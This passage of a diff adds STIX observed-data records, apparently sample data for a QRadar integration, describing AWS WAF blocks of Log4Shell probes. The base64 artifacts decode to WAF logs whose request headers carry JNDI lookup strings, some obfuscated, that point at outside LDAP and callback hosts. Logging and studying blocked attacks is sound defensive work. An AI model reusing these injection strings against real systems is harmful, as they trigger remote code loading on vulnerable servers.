+                    "type": "ipv4-addr",
+                    "value": "157.90.35.190",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1NjAzNTE5MTksImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzS25vd25CYWRJbnB1dHNSdWxlU2V0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiTG9nNEpSQ0UiLCJhY3Rpb24iOiJCTE9DSyIsInJ1bGVNYXRjaERldGFpbHMiOm51bGx9LCJub25UZXJtaW5hdGluZ01hdGNoaW5nUnVsZXMiOltdLCJleGNsdWRlZFJ1bGVzIjpudWxsfV0sInJhdGVCYXNlZFJ1bGVMaXN0IjpbXSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwicmVxdWVzdEhlYWRlcnNJbnNlcnRlZCI6bnVsbCwicmVzcG9uc2VDb2RlU2VudCI6bnVsbCwiaHR0cFJlcXVlc3QiOnsiY2xpZW50SXAiOiIxNTcuOTAuMzUuMTkwIiwiY291bnRyeSI6IkRFIiwiaGVhZGVycyI6W3sibmFtZSI6Ikhvc3QiLCJ2YWx1ZSI6IjEyNy4wLjAuMSJ9LHsibmFtZSI6IlVzZXItQWdlbnQiLCJ2YWx1ZSI6IiR7am5kaTpsZGFwOi8vMTYyLjU1LjkwLjI2Lzg3NjAxNDkxMi9DfSJ9LHsibmFtZSI6IkNvbm5lY3Rpb24iLCJ2YWx1ZSI6IkNsb3NlIn1dLCJ1cmkiOiIvIiwiYXJncyI6IiIsImh0dHBWZXJzaW9uIjoiSFRUUC8xLjEiLCJodHRwTWV0aG9kIjoiR0VUIiwicmVxdWVzdElkIjoiMS02MWI5YjQ5Zi02M2QzOTI3ZTUxNmRhNTdhMWIwZjg5MzEifSwibGFiZWxzIjpbeyJuYW1lIjoiYXdzd2FmOm1hbmFnZWQ6YXdzOmtub3duLWJhZC1pbnB1dHM6TG9nNEpSQ0UifV19",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T09:28:41.056Z",
+            "last_observed": "2021-12-15T09:28:41.056Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--8a105b95-4f51-4649-ab4a-99694e3455ba",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.704Z",
+            "modified": "2021-12-15T19:31:39.704Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-15T09:23:15.656Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T09:28:41.056Z",
+                    "end": "2021-12-15T09:28:41.056Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "Europe.Netherlands",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "165.22.196.189",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1NjAxOTU2NTYsImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzQW5vbnltb3VzSXBMaXN0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOm51bGwsIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sImV4Y2x1ZGVkUnVsZXMiOm51bGx9LHsicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQW1hem9uSXBSZXB1dGF0aW9uTGlzdCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNBbm9ueW1vdXNJcExpc3QiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiSG9zdGluZ1Byb3ZpZGVySVBMaXN0IiwiYWN0aW9uIjoiQkxPQ0siLCJydWxlTWF0Y2hEZXRhaWxzIjpudWxsfSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH1dLCJyYXRlQmFzZWRSdWxlTGlzdCI6W10sIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sInJlcXVlc3RIZWFkZXJzSW5zZXJ0ZWQiOm51bGwsInJlc3BvbnNlQ29kZVNlbnQiOm51bGwsImh0dHBSZXF1ZXN0Ijp7ImNsaWVudElwIjoiMTY1LjIyLjE5Ni4xODkiLCJjb3VudHJ5IjoiTkwiLCJoZWFkZXJzIjpbeyJuYW1lIjoiSG9zdCIsInZhbHVlIjoiNTIuNTQuMjM3LjY0In0seyJuYW1lIjoiVXNlci1BZ2VudCIsInZhbHVlIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgzLjAuNDEwMy42MSBTYWZhcmkvNTM3LjM2In0seyJuYW1lIjoiQWNjZXB0LUVuY29kaW5nIiwidmFsdWUiOiJnemlwLCBkZWZsYXRlIn0seyJuYW1lIjoiQWNjZXB0IiwidmFsdWUiOiIqLyoifSx7Im5hbWUiOiJDb25uZWN0aW9uIiwidmFsdWUiOiJrZWVwLWFsaXZlIn0seyJuYW1lIjoiWC1Gb3J3YXJkZWQtRm9yIiwidmFsdWUiOiIke2puZGk6JHtsb3dlcjpsfSR7bG93ZXI6ZH1hJHtsb3dlcjpwfTovL3hmLndvcmxkODAubG9nNGouYmluJHt1cHBlcjphfXJ5ZWRnZS5pbzo4MC9jYWxsYmFja30ifV0sInVyaSI6Ii8iLCJhcmdzIjoiIiwiaHR0cFZlcnNpb24iOiJIVFRQLzEuMSIsImh0dHBNZXRob2QiOiJHRVQiLCJyZXF1ZXN0SWQiOiIxLTYxYjliNDAzLTUyN2ZhNGY2MjM2MDYwMjU3NDYzODE3OSJ9LCJsYWJlbHMiOlt7Im5hbWUiOiJhd3N3YWY6bWFuYWdlZDphd3M6YW5vbnltb3VzLWlwLWxpc3Q6SG9zdGluZ1Byb3ZpZGVySVBMaXN0In1dfQ==",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T09:28:41.056Z",
+            "last_observed": "2021-12-15T09:28:41.056Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--5f1d8d0f-af17-410a-b3c6-5a1a06936bf9",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.704Z",
+            "modified": "2021-12-15T19:31:39.704Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-15T06:01:13.259Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T06:05:21.456Z",
+                    "end": "2021-12-15T06:05:21.456Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "NorthAmerica.UnitedStates",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "143.198.163.225",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1NDgwNzMyNTksImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzQW5vbnltb3VzSXBMaXN0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOm51bGwsIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sImV4Y2x1ZGVkUnVsZXMiOm51bGx9LHsicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQW1hem9uSXBSZXB1dGF0aW9uTGlzdCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNBbm9ueW1vdXNJcExpc3QiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiSG9zdGluZ1Byb3ZpZGVySVBMaXN0IiwiYWN0aW9uIjoiQkxPQ0siLCJydWxlTWF0Y2hEZXRhaWxzIjpudWxsfSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH1dLCJyYXRlQmFzZWRSdWxlTGlzdCI6W10sIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sInJlcXVlc3RIZWFkZXJzSW5zZXJ0ZWQiOm51bGwsInJlc3BvbnNlQ29kZVNlbnQiOm51bGwsImh0dHBSZXF1ZXN0Ijp7ImNsaWVudElwIjoiMTQzLjE5OC4xNjMuMjI1IiwiY291bnRyeSI6IlVTIiwiaGVhZGVycyI6W3sibmFtZSI6Ikhvc3QiLCJ2YWx1ZSI6IjUyLjU0LjIzNy42NCJ9LHsibmFtZSI6IlVzZXItQWdlbnQiLCJ2YWx1ZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuNjEgU2FmYXJpLzUzNy4zNiJ9LHsibmFtZSI6IkFjY2VwdC1FbmNvZGluZyIsInZhbHVlIjoiZ3ppcCwgZGVmbGF0ZSJ9LHsibmFtZSI6IkFjY2VwdCIsInZhbHVlIjoiKi8qIn0seyJuYW1lIjoiQ29ubmVjdGlvbiIsInZhbHVlIjoia2VlcC1hbGl2ZSJ9LHsibmFtZSI6IlgtRm9yd2FyZGVkLUZvciIsInZhbHVlIjoiJHtqbmRpOiR7bG93ZXI6bH0ke2xvd2VyOmR9YSR7bG93ZXI6cH06Ly94Zi53b3JsZDgwLmxvZzRqLmJpbiR7dXBwZXI6YX1yeWVkZ2UuaW86ODAvY2FsbGJhY2t9In1dLCJ1cmkiOiIvIiwiYXJncyI6IiIsImh0dHBWZXJzaW9uIjoiSFRUUC8xLjEiLCJodHRwTWV0aG9kIjoiR0VUIiwicmVxdWVzdElkIjoiMS02MWI5ODRhOS02MGQ1ZTUzODE4MmNiMjhkM2U5MTAyMTMifSwibGFiZWxzIjpbeyJuYW1lIjoiYXdzd2FmOm1hbmFnZWQ6YXdzOmFub255bW91cy1pcC1saXN0Okhvc3RpbmdQcm92aWRlcklQTGlzdCJ9XX0=",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T06:05:21.456Z",
+            "last_observed": "2021-12-15T06:05:21.456Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--d5915791-6a3a-4402-925d-78e38deff558",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.704Z",
+            "modified": "2021-12-15T19:31:39.704Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-15T06:01:13.714Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T06:05:21.456Z",
+                    "end": "2021-12-15T06:05:21.456Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "NorthAmerica.UnitedStates",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "143.198.163.225",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1NDgwNzM3MTQsImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzQW5vbnltb3VzSXBMaXN0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOm51bGwsIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sImV4Y2x1ZGVkUnVsZXMiOm51bGx9LHsicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQW1hem9uSXBSZXB1dGF0aW9uTGlzdCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNBbm9ueW1vdXNJcExpc3QiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiSG9zdGluZ1Byb3ZpZGVySVBMaXN0IiwiYWN0aW9uIjoiQkxPQ0siLCJydWxlTWF0Y2hEZXRhaWxzIjpudWxsfSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH1dLCJyYXRlQmFzZWRSdWxlTGlzdCI6W10sIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sInJlcXVlc3RIZWFkZXJzSW5zZXJ0ZWQiOm51bGwsInJlc3BvbnNlQ29kZVNlbnQiOm51bGwsImh0dHBSZXF1ZXN0Ijp7ImNsaWVudElwIjoiMTQzLjE5OC4xNjMuMjI1IiwiY291bnRyeSI6IlVTIiwiaGVhZGVycyI6W3sibmFtZSI6Ikhvc3QiLCJ2YWx1ZSI6IjUyLjU0LjIzNy42NCJ9LHsibmFtZSI6IlVzZXItQWdlbnQiLCJ2YWx1ZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuNjEgU2FmYXJpLzUzNy4zNiJ9LHsibmFtZSI6IkFjY2VwdC1FbmNvZGluZyIsInZhbHVlIjoiZ3ppcCwgZGVmbGF0ZSJ9LHsibmFtZSI6IkFjY2VwdCIsInZhbHVlIjoiKi8qIn0seyJuYW1lIjoiQ29ubmVjdGlvbiIsInZhbHVlIjoia2VlcC1hbGl2ZSJ9LHsibmFtZSI6IlgtRm9yd2FyZGVkLUZvciIsInZhbHVlIjoiJHtqbmRpOiR7bG93ZXI6bH0ke2xvd2VyOmR9YSR7bG93ZXI6cH06Ly94Zi53b3JsZDgwLmxvZzRqLmJpbiR7dXBwZXI6YX1yeWVkZ2UuaW86ODAvY2FsbGJhY2t9In1dLCJ1cmkiOiIvZmF2aWNvbi5pY28iLCJhcmdzIjoiIiwiaHR0cFZlcnNpb24iOiJIVFRQLzEuMSIsImh0dHBNZXRob2QiOiJHRVQiLCJyZXF1ZXN0SWQiOiIxLTYxYjk4NGE5LTUzMDEzNTE2MDlkOTJmZTQyYjIxMWI5NiJ9LCJsYWJlbHMiOlt7Im5hbWUiOiJhd3N3YWY6bWFuYWdlZDphd3M6YW5vbnltb3VzLWlwLWxpc3Q6SG9zdGluZ1Byb3ZpZGVySVBMaXN0In1dfQ==",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T06:05:21.456Z",
+            "last_observed": "2021-12-15T06:05:21.456Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--f98b3d32-08d7-4790-89ec-c036fb831894",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.705Z",
+            "modified": "2021-12-15T19:31:39.705Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-14T22:00:06.404Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-14T22:05:34.095Z",
+                    "end": "2021-12-14T22:05:34.095Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "Europe.RussianFederation",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "195.54.160.149",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
